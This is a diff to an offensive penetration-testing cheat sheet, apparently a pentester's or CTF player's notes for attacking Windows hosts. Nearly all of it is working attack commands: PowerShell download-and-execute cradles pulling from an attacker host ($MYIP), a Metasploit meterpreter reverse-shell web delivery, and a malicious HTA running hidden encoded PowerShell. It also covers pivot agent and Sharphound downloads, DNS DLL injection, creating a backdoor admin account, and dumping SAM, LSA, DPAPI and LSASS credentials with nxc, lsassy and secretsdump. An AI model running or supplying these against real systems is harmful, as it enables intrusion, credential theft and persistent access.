@@ -1696,13 +1696,13 @@ powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/re
 -->> Web Delivery (PowerShell)
 msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 443; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
 
--->> Create and Host Malicious .hta (Web Delivery Payload)
+-->> Host Malicious .hta + AMSI Web Delivery
 python3 -m http.server 80 /Upload
 echo '<!DOCTYPE html>\n<html>\n<head>\n<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no"/>\n<script language="VBScript">\nFunction X()\nDim XX\nSet XX = CreateObject("Wscript.Shell")\nXX.run "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGU<PAYLOAD_HERE>.......", 0, true\nEnd Function\nX\nself.close\n</script>\n</head>\n<body>\n</body>\n</html>' > /Upload/x.hta
 
 [*] File Transfer
 -->> Serve
-python3 -m http.server 139 /Upload
+python3 -m http.server 80 /Upload
 impacket-smbserver share /Upload/windows
 
 -->> Transfer From Linux
@@ -1732,8 +1732,8 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/whoami')
 tail -f /Upload/windows/output_winPEAS.txt
 
 +---------- Setup Pivot ----------+
-curl $MYIP/windows/agent.exe -o \programdata\agent.exe
-\programdata\agent.exe -ignore-cert -connect $MYIP:8080
+curl $MYIP/windows/agent.exe -o \programdata\agent
+\programdata\agent -ignore-cert -connect $MYIP:8080
 
 +---------- Sharphound Data ----------+
 curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe; \programdata\Sharphound.exe
@@ -1802,9 +1802,9 @@ dnscmd.exe /config /serverlevelplugindll \\$MYIP\$\x.dll
 
 +---------- Dump Hashes ----------+
 powershell -c "net user dbf 123qweasdF! /add ; net localgroup Administrators dbf /add"
-nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --local-auth --sam --lsa --dpapi
+nxc smb $TARGET -u 'dbf' -p '123qweasdF!' -M lsassy --local-auth
+nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --sam --lsa --dpapi --local-auth
 impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
-nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' -M lsassy
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --use-kcache --lsa --sam --dpapi --ntds --user Administrator
 
 +---------- Spray Hashes ----------+
